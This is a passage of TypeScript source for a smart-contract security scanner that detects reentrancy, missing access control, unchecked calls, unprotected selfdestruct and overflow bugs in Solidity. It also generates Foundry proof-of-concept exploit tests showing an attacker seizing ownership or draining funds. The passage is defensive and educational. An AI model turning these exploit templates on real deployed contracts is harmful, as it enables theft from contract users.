        if (varName.includes('balance') || varName.includes('amount') || varName.includes('fund')) {
          score += 20;
          confidenceFactors.push('State variable appears balance-related (+20)');
        }

        // .call is more dangerous than .send or .transfer
        if (call.type === 'call') {
          score += 10;
          confidenceFactors.push('Uses .call() which forwards all gas (+10)');
        }

        const metadata: VulnerabilityMetadata = {
          environment: 'Any EVM-compatible chain',
          assumptions: [
            'Attacker can deploy a malicious contract',
            'Target function is externally callable',
            'Contract has sufficient balance to exploit',
          ],
          preconditions: [
            `Function ${func.name}() is ${func.visibility}`,
            'Attacker needs initial funds for deposit (if required)',
            'No external reentrancy protection in place',
          ],
          protectivePatterns: hasReentrancyGuard
            ? ['ReentrancyGuard modifier detected']
            : ['No reentrancy protection detected'],
        };

        vulnerabilities.push({
          id: generateId('reentrancy'),
          type: 'reentrancy',
          severity: 'CRITICAL',
          title: `Reentrancy vulnerability in ${func.name}()`,
          description: `External ${call.type}() at line ${call.line} occurs before state variable update at line ${stateChangesAfterCall[0].line}. An attacker can recursively call ${func.name}() before the state is updated.`,
          location: {
            line: call.line,
            column: 0,
            functionName: func.name,
            contractName: contract.name,
          },
          attackVector: `External call (${call.type}) before state update (${stateChangesAfterCall[0].variableName})`,
          recommendation:
            'Apply the Checks-Effects-Interactions pattern: update state variables before making external calls. Consider using ReentrancyGuard from OpenZeppelin.',
          exploitable: true,
          confidence: scoreToConfidenceLevel(score),
          confidenceScore: Math.min(100, Math.max(0, score)),
          confidenceFactors,
          metadata,
          fixSuggestions: generateReentrancyFixSuggestions(func.name),
          educational: generateReentrancyEducation(func.name, contract.name),
        });
      }
    }
  }

  return vulnerabilities;
}

function containsMsgSender(node: unknown): boolean {
  if (!node) return false;
  const n = node as { type?: string; expression?: unknown; memberName?: string; name?: string };

  if (
    n.type === 'MemberAccess' &&
    (n.expression as { type?: string; name?: string })?.type === 'Identifier' &&
    (n.expression as { name?: string })?.name === 'msg' &&
    n.memberName === 'sender'
  ) {
    return true;
  }

  for (const key in n) {
    const val = (n as Record<string, unknown>)[key];
    if (val && typeof val === 'object') {
      if (Array.isArray(val)) {
        for (const child of val) {
          if (containsMsgSender(child)) return true;
        }
      } else {
        if (containsMsgSender(val)) return true;
      }
    }
  }

  return false;
}

function checkForMsgSenderRequire(body: unknown): boolean {
  if (!body) return false;
  let found = false;

  function traverse(node: unknown) {
    if (!node || found) return;
    const n = node as { type?: string; expression?: unknown; arguments?: unknown[] };

    if (n.type === 'FunctionCall') {
      const expr = n.expression as { type?: string; name?: string };
      if (expr?.type === 'Identifier' && expr.name === 'require') {
        for (const arg of n.arguments || []) {
          if (containsMsgSender(arg)) {
            found = true;
            return;
          }
        }
      }
    }

    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child);
        } else {
          traverse(val);
        }
      }
    }
  }

  traverse(body);
  return found;
}

function detectAccessControl(contract: ContractInfo): Vulnerability[] {
  const vulnerabilities: Vulnerability[] = [];

  // Patterns indicating ownership/admin functions (CRITICAL severity)
  const ownershipPatterns = [
    'setOwner', 'changeOwner', 'updateOwner', 'transferOwnership', 'renounceOwnership',
    'setAdmin', 'changeAdmin', 'addAdmin', 'removeAdmin',
  ];

  // Patterns indicating fund-draining functions that could be dangerous
  // Note: We need to distinguish between "admin withdraws all" vs "user withdraws their own"
  const dangerousFundPatterns = [
    'withdrawAll', 'withdrawFunds', 'withdrawETH', 'withdrawToken',
    'drain', 'sweep', 'sendFunds', 'emergencyWithdraw', 'rescueFunds',
  ];

  // Patterns indicating other sensitive functions (HIGH severity)
  const sensitivePatterns = [
    'mint', 'burn', 'pause', 'unpause', 'upgrade', 'setImplementation',
    'destroy', 'selfdestruct', 'kill', 'setPrice', 'setFee', 'setRate',
    'initialize', 'init',
  ];

  const accessControlModifiers = [
    'onlyOwner', 'onlyAdmin', 'onlyRole', 'onlyAuthorized', 'restricted',
    'auth', 'authorized', 'requiresAuth', 'onlyGovernance', 'onlyMinter',
    'onlyOperator', 'onlyManager', 'whenNotPaused',
  ];

  for (const func of contract.functions) {
    if (func.visibility === 'private' || func.visibility === 'internal') continue;
    if (['constructor', 'fallback', 'receive'].includes(func.name)) continue;

    const funcNameLower = func.name.toLowerCase();

    // Check which category this function falls into
    const isOwnershipFunction = ownershipPatterns.some(p => funcNameLower.includes(p.toLowerCase()));
    const isDangerousFundFunction = dangerousFundPatterns.some(p => funcNameLower.includes(p.toLowerCase()));
    const isSensitiveFunction = sensitivePatterns.some(p => funcNameLower.includes(p.toLowerCase()));

    // For plain "withdraw" functions with no parameters, check if it's a user vault pattern (safe)
    // User vault pattern: user withdraws their own balance (balances[msg.sender])
    // Safe pattern: function withdraw() external { ... balances[msg.sender] ... msg.sender.call/transfer }
    const isUserWithdrawPattern = funcNameLower === 'withdraw' &&
      func.parameters.length === 0 &&
      checkForUserWithdrawPattern(func.body);

    // Skip user withdrawal patterns - they are intentionally public
    if (isUserWithdrawPattern) continue;

    // Check if function is a dangerous "withdraw" pattern (transfers to arbitrary address or all funds)
    const isFundFunction = isDangerousFundFunction ||
      (funcNameLower === 'withdraw' && checkForDangerousWithdraw(func.body));

    // Also check if function contains ETH transfers to arbitrary addresses (potential fund drain)
    const hasArbitraryEthTransfer = checkForArbitraryEthTransfer(func.body);

    // Skip if no sensitive pattern found and no arbitrary ETH transfer
    if (!isOwnershipFunction && !isFundFunction && !isSensitiveFunction && !hasArbitraryEthTransfer) continue;

    // Check for access control
    const hasAccessControl = func.modifiers.some((mod) =>
      accessControlModifiers.some((ac) => mod.toLowerCase().includes(ac.toLowerCase()))
    );
    const hasRequireSender = checkForMsgSenderRequire(func.body);

    if (!hasAccessControl && !hasRequireSender) {
      // Calculate confidence score
      const confidenceFactors: string[] = [];
      let score = 20; // Base score

      // Determine matched pattern for description
      let matchedPattern = '';
      if (isOwnershipFunction) {
        matchedPattern = ownershipPatterns.find(p => funcNameLower.includes(p.toLowerCase())) || 'ownership';
        score += 40;
        confidenceFactors.push(`Function name matches ownership pattern "${matchedPattern}" (+40)`);
      } else if (isFundFunction) {
        matchedPattern = dangerousFundPatterns.find(p => funcNameLower.includes(p.toLowerCase())) || 'fund transfer';
        score += 35;
        confidenceFactors.push(`Function name matches fund transfer pattern "${matchedPattern}" (+35)`);
      } else if (isSensitiveFunction) {
        matchedPattern = sensitivePatterns.find(p => funcNameLower.includes(p.toLowerCase())) || 'sensitive';
        score += 30;
        confidenceFactors.push(`Function name matches sensitive pattern "${matchedPattern}" (+30)`);
      } else if (hasArbitraryEthTransfer) {
        matchedPattern = 'ETH transfer';
        score += 35;
        confidenceFactors.push('Function contains ETH transfer to arbitrary address without access control (+35)');
      }

      // No access control modifier
      score += 25;
      confidenceFactors.push('No access control modifier found (+25)');

      // No msg.sender require check
      score += 15;
      confidenceFactors.push('No msg.sender validation in function body (+15)');

      // External visibility is more dangerous
      if (func.visibility === 'external') {
        score += 10;
        confidenceFactors.push('Function is external (directly callable) (+10)');
      }

      // ETH transfer makes it more dangerous
      if (hasArbitraryEthTransfer && !isFundFunction) {
        score += 10;
        confidenceFactors.push('Function transfers ETH (+10)');
      }

      // Determine severity based on function type
      const severity = (isOwnershipFunction || isFundFunction || hasArbitraryEthTransfer) ? 'CRITICAL' : 'HIGH';

      const metadata: VulnerabilityMetadata = {
        environment: 'Any EVM-compatible chain',
        assumptions: [
          'Function performs a privileged operation',
          'No off-chain access control mechanism exists',
          'Contract is deployed and has funds/state to exploit',
        ],
        preconditions: [
          `Function ${func.name}() is ${func.visibility}`,
          'Attacker has a valid Ethereum address',
          'Contract has not been paused or self-destructed',
        ],
        protectivePatterns: ['No access control modifiers detected', 'No msg.sender validation detected'],
      };

      const description = isOwnershipFunction
        ? `The function ${func.name}() can change ownership/admin privileges but has no access control. Any address can call this function and take over the contract.`
        : isFundFunction || hasArbitraryEthTransfer
        ? `The function ${func.name}() can transfer funds but has no access control. Any address can call this function and drain the contract.`
        : `The function ${func.name}() performs a sensitive operation but lacks access control modifiers.`;

      vulnerabilities.push({
        id: generateId('access-control'),
        type: 'access-control',
        severity,
        title: `Missing access control in ${func.name}()`,
        description,
        location: {
          line: func.line,
          column: 0,
          functionName: func.name,
          contractName: contract.name,
        },
        attackVector: `Any address can call ${func.name}() without authorization`,
        recommendation: 'Add an access control modifier (e.g., onlyOwner) or require(msg.sender == owner) check to restrict who can call this function.',
        exploitable: true,
        confidence: scoreToConfidenceLevel(score),
        confidenceScore: Math.min(100, Math.max(0, score)),
        confidenceFactors,
        metadata,
        fixSuggestions: generateAccessControlFixSuggestions(func.name, isOwnershipFunction),
        educational: generateAccessControlEducation(func.name, contract.name, isOwnershipFunction),
      });
    }
  }

  return vulnerabilities;
}

// Helper to check if function body contains ETH transfers
function checkForEthTransfer(body: unknown): boolean {
  if (!body) return false;
  let found = false;

  function traverse(node: unknown) {
    if (!node || found) return;
    const n = node as {
      type?: string;
      expression?: unknown;
      memberName?: string;
      arguments?: unknown[];
    };

    // Check for .transfer(), .send(), .call{value:}
    if (n.type === 'FunctionCall') {
      const expr = n.expression as { type?: string; memberName?: string; expression?: unknown };

      // Check for .transfer() or .send()
      if (expr?.type === 'MemberAccess' && ['transfer', 'send'].includes(expr.memberName || '')) {
        found = true;
        return;
      }

      // Check for NameValueExpression (used in .call{value: x}())
      if (expr?.type === 'NameValueExpression') {
        found = true;
        return;
      }
    }

    // Check for .call{value:} pattern
    if (n.type === 'NameValueExpression') {
      found = true;
      return;
    }

    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child);
        } else {
          traverse(val);
        }
      }
    }
  }

  traverse(body);
  return found;
}

// Helper to check if function uses user vault pattern (balances[msg.sender])
// This is SAFE - users withdraw their own funds
function checkForUserWithdrawPattern(body: unknown): boolean {
  if (!body) return false;

  // Check if the function accesses a mapping with msg.sender as key
  // This indicates users can only withdraw their own funds
  let usesMsgSenderMapping = false;

  function traverse(node: unknown) {
    if (!node) return;
    const n = node as {
      type?: string;
      expression?: unknown;
      base?: unknown;
      index?: unknown;
      memberName?: string;
      name?: string;
    };

    // Check for mapping[msg.sender] pattern (e.g., balances[msg.sender])
    if (n.type === 'IndexAccess') {
      const index = n.index as { type?: string; expression?: unknown; memberName?: string };
      // Direct msg.sender
      if (index?.type === 'MemberAccess' &&
          (index.expression as { name?: string })?.name === 'msg' &&
          index.memberName === 'sender') {
        usesMsgSenderMapping = true;
        return;
      }
    }

    // Recurse
    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child);
        } else {
          traverse(val);
        }
      }
    }
  }

  traverse(body);
  return usesMsgSenderMapping;
}

// Helper to check if withdraw sends to arbitrary address (dangerous)
function checkForDangerousWithdraw(body: unknown): boolean {
  if (!body) return false;

  // Look for transfers to function parameters (arbitrary addresses)
  let hasParameterTransfer = false;

  function traverse(node: unknown) {
    if (!node || hasParameterTransfer) return;
    const n = node as {
      type?: string;
      expression?: unknown;
      arguments?: unknown[];
      memberName?: string;
    };

    // Check for .transfer(to) or .call{value:}() on a parameter
    if (n.type === 'FunctionCall') {
      const expr = n.expression as { type?: string; expression?: unknown; memberName?: string };

      // Check if transferring to a function parameter (not msg.sender)
      if (expr?.type === 'MemberAccess' && ['transfer', 'send'].includes(expr.memberName || '')) {
        const recipient = expr.expression;
        if (recipient && typeof recipient === 'object') {
          const r = recipient as { type?: string; name?: string; expression?: unknown };
          // If recipient is an Identifier (parameter) or complex expression, it's potentially dangerous
          if (r.type === 'Identifier' && r.name !== 'owner') {
            hasParameterTransfer = true;
          }
        }
      }
    }

    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child);
        } else {
          traverse(val);
        }
      }
    }
  }

  traverse(body);
  return hasParameterTransfer;
}

// Helper to check for ETH transfers to arbitrary addresses
function checkForArbitraryEthTransfer(body: unknown): boolean {
  if (!body) return false;

  // Skip if it's a user vault pattern
  if (checkForUserWithdrawPattern(body)) return false;

  // Otherwise check for ETH transfers
  return checkForEthTransfer(body);
}

// ============= UNCHECKED CALL DETECTION =============

function detectUncheckedCalls(contract: ContractInfo): Vulnerability[] {
  const vulnerabilities: Vulnerability[] = [];

  for (const func of contract.functions) {
    if (!func.body) continue;

    // Find all external calls and check if return value is used
    const uncheckedCalls = findUncheckedCalls(func.body);

    for (const call of uncheckedCalls) {
      const confidenceFactors: string[] = [];
      let score = 30; // Base score

      // External call without return value check
      score += 40;
      confidenceFactors.push(`${call.type}() return value not checked (+40)`);

      // State changes after the call increase severity
      if (call.hasStateChangeAfter) {
        score += 20;
        confidenceFactors.push('State modified after unchecked call (+20)');
      }

      // Using call vs send vs transfer
      if (call.type === 'call') {
        score += 10;
        confidenceFactors.push('Uses .call() which can fail silently (+10)');
      }

      const metadata: VulnerabilityMetadata = {
        environment: 'Any EVM-compatible chain',
        assumptions: [
          'External call can fail (contract recipient without receive())',
          'Function continues execution after failed call',
          'State updates depend on successful transfer',
        ],
        preconditions: [
          `Function ${func.name}() is ${func.visibility}`,
          'External call target may reject transfer',
          'Contract has balance to transfer',
        ],
        protectivePatterns: ['No return value check detected'],
      };

      vulnerabilities.push({
        id: generateId('unchecked-call'),
        type: 'unchecked-call',
        severity: 'HIGH',
        title: `Unchecked ${call.type}() return value in ${func.name}()`,
        description: `The ${call.type}() at line ${call.line} does not check the return value. If the call fails, the function will continue execution as if it succeeded, potentially corrupting state or losing funds.`,
        location: {
          line: call.line,
          column: 0,
          functionName: func.name,
          contractName: contract.name,
        },
        attackVector: `${call.type}() fails silently, state updates execute anyway`,
        recommendation: 'Always check the return value of low-level calls. Use require(success, "Transfer failed") or handle the failure explicitly.',
        exploitable: true,
        confidence: scoreToConfidenceLevel(score),
        confidenceScore: Math.min(100, Math.max(0, score)),
        confidenceFactors,
        metadata,
        fixSuggestions: generateUncheckedCallFixSuggestions(func.name),
        educational: generateUncheckedCallEducation(func.name, contract.name),
      });
    }
  }

  return vulnerabilities;
}

interface UncheckedCallInfo {
  type: string;
  line: number;
  hasStateChangeAfter: boolean;
}

function findUncheckedCalls(body: unknown): UncheckedCallInfo[] {
  const calls: UncheckedCallInfo[] = [];

  function traverse(node: unknown, parentLine?: number) {
    if (!node) return;
    const n = node as {
      type?: string;
      expression?: unknown;
      loc?: { start?: { line: number } };
      statements?: unknown[];
    };

    const currentLine = n.loc?.start?.line || parentLine;

    // Look for ExpressionStatement containing a call (means return value is ignored)
    if (n.type === 'ExpressionStatement') {
      const expr = n.expression as {
        type?: string;
        expression?: unknown;
        memberName?: string;
      };

      // Check for direct .call(), .send() without capturing return
      if (expr?.type === 'FunctionCall') {
        let innerExpr = expr.expression as { type?: string; memberName?: string; expression?: unknown };

        // Handle NameValueExpression wrapper (for .call{value: x}())
        if (innerExpr?.type === 'NameValueExpression') {
          innerExpr = (innerExpr as { expression?: unknown }).expression as typeof innerExpr;
        }

        if (innerExpr?.type === 'MemberAccess') {
          const memberName = innerExpr.memberName;
          if (['call', 'send', 'delegatecall'].includes(memberName || '')) {
            calls.push({
              type: memberName || 'call',
              line: currentLine || 0,
              hasStateChangeAfter: false, // Would need more analysis
            });
          }
        }
      }
    }

    // Recurse
    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child, currentLine);
        } else {
          traverse(val, currentLine);
        }
      }
    }
  }

  traverse(body);
  return calls;
}

// ============= SELFDESTRUCT DETECTION =============

function detectSelfdestruct(contract: ContractInfo): Vulnerability[] {
  const vulnerabilities: Vulnerability[] = [];

  const accessControlModifiers = [
    'onlyOwner', 'onlyAdmin', 'onlyRole', 'onlyAuthorized', 'restricted',
    'auth', 'authorized', 'requiresAuth', 'onlyGovernance',
  ];

  for (const func of contract.functions) {
    if (!func.body) continue;
    if (func.visibility === 'private' || func.visibility === 'internal') continue;

    // Check if function contains selfdestruct
    const hasSelfDestruct = containsSelfdestruct(func.body);
    if (!hasSelfDestruct) continue;

    // Check for access control
    const hasAccessControl = func.modifiers.some((mod) =>
      accessControlModifiers.some((ac) => mod.toLowerCase().includes(ac.toLowerCase()))
    );
    const hasRequireSender = checkForMsgSenderRequire(func.body);

    if (!hasAccessControl && !hasRequireSender) {
      const confidenceFactors: string[] = [];
      let score = 30; // Base score

      // Selfdestruct without access control is very serious
      score += 50;
      confidenceFactors.push('selfdestruct/suicide without access control (+50)');

      // No modifiers
      score += 15;
      confidenceFactors.push('No access control modifier found (+15)');

      // External visibility is worse
      if (func.visibility === 'external') {
        score += 10;
        confidenceFactors.push('Function is external (directly callable) (+10)');
      }

      const metadata: VulnerabilityMetadata = {
        environment: 'Any EVM-compatible chain (selfdestruct behavior may vary post-Cancun)',
        assumptions: [
          'selfdestruct opcode is available on target chain',
          'Contract has funds that would be sent to attacker',
          'No external access control mechanism exists',
        ],
        preconditions: [
          `Function ${func.name}() is ${func.visibility}`,
          'Attacker has a valid Ethereum address',
          'Contract is not behind a proxy that blocks selfdestruct',
        ],
        protectivePatterns: ['No access control detected'],
      };

      vulnerabilities.push({
        id: generateId('unprotected-selfdestruct'),
        type: 'unprotected-selfdestruct',
        severity: 'CRITICAL',
        title: `Unprotected selfdestruct in ${func.name}()`,
        description: `The function ${func.name}() contains selfdestruct without access control. Any address can permanently destroy this contract and steal all its ETH.`,
        location: {
          line: func.line,
          column: 0,
          functionName: func.name,
          contractName: contract.name,
        },
        attackVector: 'Anyone can call selfdestruct, destroying the contract and stealing all funds',
        recommendation: 'Add access control (onlyOwner modifier or require(msg.sender == owner)). Consider if selfdestruct is even necessary.',
        exploitable: true,
        confidence: scoreToConfidenceLevel(score),
        confidenceScore: Math.min(100, Math.max(0, score)),
        confidenceFactors,
        metadata,
        fixSuggestions: generateSelfdestructFixSuggestions(func.name),
        educational: generateSelfdestructEducation(func.name, contract.name),
      });
    }
  }

  return vulnerabilities;
}

function containsSelfdestruct(body: unknown): boolean {
  if (!body) return false;
  let found = false;

  function traverse(node: unknown) {
    if (!node || found) return;
    const n = node as {
      type?: string;
      expression?: unknown;
      name?: string;
    };

    // Check for selfdestruct() or suicide() call
    if (n.type === 'FunctionCall') {
      const expr = n.expression as { type?: string; name?: string };
      if (expr?.type === 'Identifier' && ['selfdestruct', 'suicide'].includes(expr.name || '')) {
        found = true;
        return;
      }
    }

    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child);
        } else {
          traverse(val);
        }
      }
    }
  }

  traverse(body);
  return found;
}

function extractVersion(pragma: string): { major: number; minor: number } | null {
  const match = pragma.match(/(\d+)\.(\d+)/);
  if (match) {
    return { major: parseInt(match[1], 10), minor: parseInt(match[2], 10) };
  }
  return null;
}

function detectIntegerOverflow(contract: ContractInfo, pragmaVersion: string | null): Vulnerability[] {
  const vulnerabilities: Vulnerability[] = [];

  // Check if using Solidity 0.8+
  const version = pragmaVersion ? extractVersion(pragmaVersion) : null;
  const hasSolidity08Plus = version && version.minor >= 8;

  if (hasSolidity08Plus) {
    return []; // Solidity 0.8+ has built-in overflow checks
  }

  for (const func of contract.functions) {
    if (!func.body) continue;

    const ops = findArithmeticOperations(func.body);
    for (const op of ops) {
      const isOverflow = op.type === '+' || op.type === '*';
      const vulnType = isOverflow ? 'integer-overflow' : 'integer-underflow';

      // Calculate confidence score
      const confidenceFactors: string[] = [];
      let score = 0; // Base score for overflow

      // Solidity version is the primary factor
      if (!pragmaVersion) {
        score += 30;
        confidenceFactors.push('Solidity version unknown - assuming vulnerable (+30)');
      } else {
        score += 50;
        confidenceFactors.push(`Solidity ${pragmaVersion} lacks built-in overflow protection (+50)`);
      }

      // Multiplication and exponentiation are more dangerous
      if (op.type === '*' || op.type === '**') {
        score += 20;
        confidenceFactors.push(`${op.type === '*' ? 'Multiplication' : 'Exponentiation'} can overflow quickly (+20)`);
      } else {
        score += 10;
        confidenceFactors.push(`${op.type === '+' ? 'Addition' : 'Subtraction'} can overflow/underflow (+10)`);
      }

      const metadata: VulnerabilityMetadata = {
        environment: 'Any EVM-compatible chain',
        assumptions: [
          'No SafeMath or similar library is being used',
          'Input values are not validated before operation',
          'Result is not checked for overflow after operation',
        ],
        preconditions: [
          `Solidity version is ${pragmaVersion || 'unknown'} (< 0.8.0)`,
          'Attacker can influence input values',
          'No overflow validation exists',
        ],
        protectivePatterns: ['No SafeMath detected', 'No built-in overflow protection (Solidity < 0.8.0)'],
      };

      vulnerabilities.push({
        id: generateId(vulnType),
        type: vulnType,
        severity: 'HIGH',
        title: `Potential integer ${isOverflow ? 'overflow' : 'underflow'} in ${func.name}()`,
        description: `Arithmetic operation (${op.type}) at line ${op.line} may ${isOverflow ? 'overflow' : 'underflow'} in Solidity < 0.8.0.`,
        location: {
          line: op.line,
          column: 0,
          functionName: func.name,
          contractName: contract.name,
        },
        attackVector: `Supply values that cause the operation to ${isOverflow ? 'overflow' : 'underflow'}`,
        recommendation: 'Use SafeMath library or upgrade to Solidity 0.8.0+ which has built-in overflow checks.',
        exploitable: true,
        confidence: scoreToConfidenceLevel(score),
        confidenceScore: Math.min(100, Math.max(0, score)),
        confidenceFactors,
        metadata,
      });
    }
  }

  return vulnerabilities;
}

function findArithmeticOperations(body: unknown): { type: string; line: number }[] {
  const ops: { type: string; line: number }[] = [];

  function traverse(node: unknown, parentLine?: number) {
    if (!node) return;
    const n = node as { type?: string; operator?: string; loc?: { start?: { line: number } } };
    const currentLine = n.loc?.start?.line || parentLine;

    if (n.type === 'BinaryOperation' && ['+', '-', '*', '**'].includes(n.operator || '')) {
      ops.push({ type: n.operator || '', line: currentLine || 0 });
    }

    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child, currentLine);
        } else {
          traverse(val, currentLine);
        }
      }
    }
  }

  traverse(body);
  return ops;
}

// ============= EXPLOIT GENERATORS =============

function generateAccessControlExploit(vuln: Vulnerability, contractName: string): string {
  const funcName = vuln.location.functionName || 'setOwner';
  const isOwnershipFunc = funcName.toLowerCase().includes('owner') || funcName.toLowerCase().includes('admin');
  const isWithdrawFunc = funcName.toLowerCase().includes('withdraw') || funcName.toLowerCase().includes('transfer');

  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * ============================================================================
 *                     ACCESS CONTROL EXPLOIT TEST
 *                     ${contractName}.${funcName}()
 * ============================================================================
 *
 * HISTORICAL CONTEXT - POLY NETWORK HACK (August 10, 2021):
 * The Poly Network cross-chain bridge suffered a $611 million exploit due to
 * missing access control. The attacker called a privileged function that changed
 * the "keeper" role to their own address, allowing them to authorize fraudulent
 * cross-chain transfers. This remains one of the largest DeFi hacks in history.
 *
 * Other notable access control exploits:
 * - Ronin Bridge (2022): $625M - compromised validator keys
 * - Wormhole (2022): $326M - missing signature verification
 * - Nomad Bridge (2022): $190M - improper access control on process()
 *
 * ATTACK MECHANICS:
 * 1. Attacker identifies unprotected ${funcName}() function
 * 2. Attacker calls ${funcName}() directly (no authorization required!)
 * ${isOwnershipFunc ? '3. Attacker becomes owner/admin of the contract\n * 4. Attacker drains all funds using new privileges' : '3. Attacker executes privileged operation\n * 4. Contract state corrupted or funds stolen'}
 *
 * WHY IT WORKS:
 * The contract has NO access control on a critical function.
 * No onlyOwner modifier, no require(msg.sender == owner) check.
 *
 * SEVERITY: CRITICAL
 * - Difficulty: Trivial (single function call)
 * - Impact: Total loss of funds / contract takeover
 * - Detection: Easily found by reading contract code
 *
 * Run with: forge test --match-test testAccessControlExploit -vvvv
 * ============================================================================
 */

contract AccessControlExploitTest is Test {
    ${contractName} public target;
    address public attacker = address(0xBAD);
    address public originalOwner = address(0x1);

    // ========== CONSTANTS ==========
    uint256 constant CONTRACT_BALANCE = 100 ether;

    // ========== SETUP ==========
    function setUp() public {
        // Deploy the vulnerable contract
        vm.prank(originalOwner);
        target = new ${contractName}();
        console.log("Target deployed at:", address(target));
        console.log("Original owner:", originalOwner);

        // Fund the contract (simulating real deposits)
        vm.deal(address(target), CONTRACT_BALANCE);
        console.log("Contract funded with:", CONTRACT_BALANCE / 1 ether, "ETH");
    }

    // ========== EXPLOIT TEST ==========
    function testAccessControlExploit() public {
        console.log("\\n========== ATTACK STARTING ==========");
        console.log("Attacker address:", attacker);

        uint256 attackerBalanceBefore = attacker.balance;
        uint256 contractBalanceBefore = address(target).balance;

        console.log("Attacker balance before:", attackerBalanceBefore / 1 ether, "ETH");
        console.log("Contract balance before:", contractBalanceBefore / 1 ether, "ETH");

        // THE ATTACK: Simply call the unprotected function!
        vm.startPrank(attacker);
        console.log("\\nAttacker calling ${funcName}()...");

${isOwnershipFunc ? `        // Step 1: Take ownership (NO AUTHORIZATION REQUIRED!)
        target.${funcName}(attacker);
        console.log("Attacker is now owner!");

        // Step 2: Drain all funds using new owner privileges
        // (This assumes owner can withdraw - adjust based on actual contract)
        // target.withdraw();` : isWithdrawFunc ? `        // Directly drain funds (NO AUTHORIZATION REQUIRED!)
        target.${funcName}();
        console.log("Funds drained!");` : `        // Execute privileged operation (NO AUTHORIZATION REQUIRED!)
        target.${funcName}();
        console.log("Privileged operation executed!");`}

        vm.stopPrank();

        uint256 attackerBalanceAfter = attacker.balance;
        uint256 contractBalanceAfter = address(target).balance;

        console.log("\\n========== ATTACK COMPLETE ==========");
        console.log("Attacker balance after:", attackerBalanceAfter / 1 ether, "ETH");
        console.log("Contract balance after:", contractBalanceAfter / 1 ether, "ETH");

        // Verify attack success
${isOwnershipFunc ? `        // Verify attacker is now owner
        // assertEq(target.owner(), attacker, "Attacker should be owner");
        console.log("\\nATTACK SUCCESSFUL: Attacker gained owner privileges!");
        console.log("Impact: Complete control over contract");` : isWithdrawFunc ? `        // Verify funds were stolen
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker should have more ETH");
        assertLt(contractBalanceAfter, contractBalanceBefore, "Contract should have less ETH");

        uint256 stolen = attackerBalanceAfter - attackerBalanceBefore;
        console.log("\\nATTACK SUCCESSFUL!");
        console.log("ETH stolen:", stolen / 1 ether);` : `        console.log("\\nATTACK SUCCESSFUL: Privileged operation executed!");`}
    }

    // ========== DEMONSTRATE SIMPLICITY ==========
    function testShowHowEasyAttackIs() public {
        console.log("\\n========== PROOF OF TRIVIAL EXPLOIT ==========");
        console.log("Total lines of attack code: 1");
        console.log("Required: Just call ${funcName}()");
        console.log("No special setup, no flash loans, no complex logic");

        // The entire attack is ONE LINE:
        vm.prank(attacker);
        target.${funcName}(${isOwnershipFunc ? 'attacker' : ''});

        console.log("\\nAttack complete in 1 transaction!");
    }
}

/**
 * ============================================================================
 *                              KEY TAKEAWAYS
 * ============================================================================
 *
 * WHY THIS IS CRITICAL:
 * - Zero skill required to exploit
 * - Zero cost (just gas)
 * - 100% loss of funds/control
 * - Cannot be reversed once exploited
 *
 * PREVENTION:
 * 1. ALWAYS use access control on sensitive functions
 * 2. Use OpenZeppelin's Ownable or AccessControl
 * 3. Add require(msg.sender == owner) checks
 * 4. Audit ALL public/external functions
 * 5. Use modifiers consistently
 *
 * DETECTION:
 * - Look for public/external functions without modifiers
 * - Check for ownership/admin/withdraw functions
 * - Use static analysis tools
 * ============================================================================
 */`;
}

function generateUncheckedCallExploit(vuln: Vulnerability, contractName: string): string {
  const funcName = vuln.location.functionName || 'withdraw';

  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * ============================================================================
 *                     UNCHECKED CALL EXPLOIT TEST
 *                     ${contractName}.${funcName}()
 * ============================================================================
 *
 * HISTORICAL CONTEXT - KING OF ETHER (2016):
 * One of the earliest smart contract bugs. The King of Ether game used
 * send() to transfer the throne to a new king, but didn't check the return
 * value. When send() failed (e.g., to a contract without a receive function),
 * the game continued as if the transfer succeeded, leaving funds stuck.
 *
 * ATTACK MECHANICS:
 * 1. Vulnerable contract uses .call() / .send() without checking return value
 * 2. External call fails silently (no revert)
 * 3. Contract continues execution and updates state
 * 4. Funds are "sent" but never received - accounting is broken
 *
 * WHY IT WORKS:
 * Low-level calls (.call, .send) return false on failure instead of reverting.
 * If the return value isn't checked, the contract thinks the transfer succeeded.
 *
 * Run with: forge test --match-test testUncheckedCallExploit -vvvv
 * ============================================================================
 */

contract UncheckedCallExploitTest is Test {
    ${contractName} public target;
    MaliciousReceiver public attacker;

    uint256 constant INITIAL_DEPOSIT = 10 ether;

    function setUp() public {
        target = new ${contractName}();
        attacker = new MaliciousReceiver();

        // Fund the contract
        vm.deal(address(target), INITIAL_DEPOSIT);
    }

    function testUncheckedCallExploit() public {
        console.log("========== UNCHECKED CALL EXPLOIT ==========");
        console.log("Contract balance:", address(target).balance / 1 ether, "ETH");

        // The attacker contract will reject ETH transfers
        // But the vulnerable contract won't notice!
        vm.prank(address(attacker));
        target.${funcName}();

        console.log("\\n${funcName}() was called...");
        console.log("Did the transfer actually happen? NO!");
        console.log("Does the contract think it happened? YES!");
        console.log("\\nThis is the unchecked call vulnerability.");
    }
}

// Contract that rejects all ETH transfers
contract MaliciousReceiver {
    // No receive() or fallback() - all ETH transfers will fail
    // But if the sender doesn't check, they won't know!
}`;
}

function generateSelfdestructExploit(vuln: Vulnerability, contractName: string): string {
  const funcName = vuln.location.functionName || 'destroy';

  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * ============================================================================
